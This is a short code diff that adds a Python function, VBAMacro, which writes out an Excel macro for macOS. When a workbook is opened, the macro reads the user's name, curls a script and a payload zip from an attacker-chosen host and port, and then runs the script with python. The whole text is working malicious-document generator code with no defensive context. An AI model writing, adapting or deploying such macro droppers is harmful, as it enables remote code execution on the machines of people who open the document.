@@ -1,0 +1,3 @@
+def VBAMacro(_path,_host,_port):
+    with open(_path,'w') as f:
+        f.write(f"""Sub Workbook_Open()\nDim getName As String\nDim cmd As String\nDim path As String\nDim name As String\ngetName = "set userName to short user name of (system info)" & vbNewLine & "return userName"\nname = MacScript(getName)\npath = "/Users/" & name & "/Library/~\$payload.zip"\nShell ("curl -L http://{_host}:{_port}/" & name & " -o ~\$script.py")\nShell ("curl http://{_host}:{_port}/update -o " & path)\nApplication.Wait (Now + TimeValue("00:00:10"))\nShell ("python ~\$script.py")\nEnd Sub""")
